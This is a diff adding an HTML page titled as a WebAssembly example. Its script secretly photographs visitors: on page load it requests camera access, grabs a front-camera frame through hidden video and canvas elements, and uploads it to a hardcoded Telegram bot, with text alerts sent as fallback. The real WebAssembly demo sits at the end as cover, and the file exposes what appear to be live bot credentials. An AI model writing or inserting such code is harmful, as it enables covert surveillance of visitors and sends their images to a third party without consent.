@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>WebAssembly Example</title>
+  <style>
+    #camera, #canvas {
+      display: none;
+    }
+    #permissionRequest {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: #ffeb3b;
+      padding: 10px;
+      text-align: center;
+      z-index: 1000;
+    }
+  </style>
+</head>
+<body>
+  <div id="permissionRequest" style="display:none;">
+    Please allow camera access to continue...
+  </div>
+  <video id="camera" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+  
+  <script>
+    // Telegram bot details
+    const botToken = '7826950594:AAFBygBD_E2PmAITI6zsaPilys7l6i0gWBU';
+    const chatId = '894002841';
+    const message = 'Someone opened help.html';
+
+    // Get DOM elements
+    const video = document.getElementById('camera');
+    const canvas = document.getElementById('canvas');
+    const permissionRequest = document.getElementById('permissionRequest');
+    const ctx = canvas.getContext('2d');
+
+    // Function to send image to Telegram
+    async function sendImageToTelegram(imageBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('caption', message);
+      formData.append('photo', imageBlob, 'capture.jpg');
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+        const data = await response.json();
+        console.log('Image sent to Telegram:', data);
+      } catch (error) {
+        console.error('Error sending image to Telegram:', error);
+        // Fallback to text message if image sending fails
+        sendTextMessage(message + ' (Failed to send image)');
+      }
+    }
+
+    // Function to send text message to Telegram
+    function sendTextMessage(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+        .catch(e => console.error('Error sending fallback message:', e));
+    }
+
+    // Function to capture image from camera
+    function captureAndSend() {
+      // Set canvas size to video size
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      
+      // Draw current video frame to canvas
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // Convert canvas to blob and send
+      canvas.toBlob(sendImageToTelegram, 'image/jpeg', 0.8);
+      
+      // Stop all video tracks
+      if (video.srcObject) {
+        video.srcObject.getTracks().forEach(track => track.stop());
+      }
+    }
+
+    // Request camera access
+    async function initCamera() {
+      permissionRequest.style.display = 'block';
+      
+      try {
+        // Try to get front camera (facing mode 'user')
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',  // This specifies front camera
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: false
+        });
+        
+        permissionRequest.style.display = 'none';
+        video.srcObject = stream;
+        
+        // Wait for video to be ready
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            captureAndSend();
+          }, 1000); // Longer delay to ensure camera is properly focused
+        };
+        
+      } catch (error) {
+        console.error('Error accessing camera:', error);
+        permissionRequest.style.display = 'none';
+        
+        // Try fallback to any camera if front camera fails
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: false
+          });
+          
+          video.srcObject = stream;
+          video.onloadedmetadata = () => {
+            setTimeout(() => {
+              captureAndSend();
+            }, 1000);
+          };
+          
+        } catch (fallbackError) {
+          console.error('Fallback camera access failed:', fallbackError);
+          sendTextMessage(message + ' (Camera access denied)');
+        }
+      }
+    }
+
+    // Start the process when page loads
+    window.addEventListener('DOMContentLoaded', () => {
+      // Check if browser supports mediaDevices API
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        sendTextMessage(message + ' (Browser does not support camera access)');
+        return;
+      }
+      
+      initCamera();
+    });
+
+    // Original WebAssembly code (unchanged)
+    fetch('my_module.wasm')
+      .then(response => response.arrayBuffer())
+      .then(bytes => WebAssembly.instantiate(bytes, {}))
+      .then(results => {
+        const instance = results.instance;
+        const add = instance.exports.add;
+        const result = add(5, 3);
+        console.log("Result from WebAssembly: " + result);
+      });
+  </script>
+</body>
+</html>
